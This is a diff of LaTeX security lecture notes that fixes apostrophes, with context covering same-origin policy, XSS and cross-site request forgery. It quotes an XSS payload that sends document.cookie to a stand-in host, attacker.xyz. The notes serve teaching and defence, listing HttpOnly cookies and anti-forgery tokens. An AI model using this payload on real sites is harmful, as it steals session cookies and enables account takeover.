@@ -105,7 +105,7 @@ Type & Advantage & Disadvantage \\
 
 \pgra{Browser/JavaScript Same-Origin Policy} Same-origin policy defines access rights: A script can
 only access content and properties of a document loaded from the same origin as the document containing the script. Same origin means: same protocol, same hostname, same port.\\ Examples: script in a document loaded from {\tt site.tld} can access documents {\tt site.tld/here} \& {\tt site.tld/a/there} but not {\tt site.tld:8080/there} or {\tt bank.tld/yonder}.\\
-\textbf{Never include scripts you don‘t trust:} \\
+\textbf{Never include scripts you don't trust:} \\
 {\tt <script src=“http://you.tld/cnt.js“></script>}
 
 the script loaded from {\tt you.tld} is evaluated in the context of origin {\tt me.tld}! 
@@ -114,7 +114,7 @@ the script loaded from {\tt you.tld} is evaluated in the context of origin {\tt 
 \textit{XSS Attack:} 
 \begin{enumerate}
 \item XSS vulnerability used to inject code into a web page
-\item Code is executed in the victim‘s browser under the web site‘s domain (hijack user sessions, deface web sites, introduce worms)
+\item Code is executed in the victim's browser under the web site's domain (hijack user sessions, deface web sites, introduce worms)
 \end{enumerate}
 
 \textit{XSS attack targets the user of the system rather than the system itself (unlike SQL injection).}
@@ -190,9 +190,9 @@ $<$script$>$￼document.write('$<$img\%20src=\\
 "http://www.attacker.xyz/capture.php?cookie=',\\
 escape(document.cookie),'"$>$')$<$/script$>$
 
-Malicious actions: get victim‘s cookie and alter orders, purchase with his credit card, reset account pwd, etc.
+Malicious actions: get victim's cookie and alter orders, purchase with his credit card, reset account pwd, etc.
 
-\pgra{XSS Prevention:} HttpOnly cookies, can‘t be read by client script, not widely supported ￼￼parameter in webpage
+\pgra{XSS Prevention:} HttpOnly cookies, can't be read by client script, not widely supported ￼￼parameter in webpage
 
 \pgra{XSRF - Cross-Site Request Forgery:} A form from one domain posts a request to a different domain through an authenticated session. Website {\tt attacker.tld} uses a form in a hidden {\tt iframe} to automatically post a new password to a web service, where the victim is currently logged in. \textit{Write-only attack.}\\
 \textit{Remedy:} Use a hidden security token, ask for old password, captcha, http referer headers
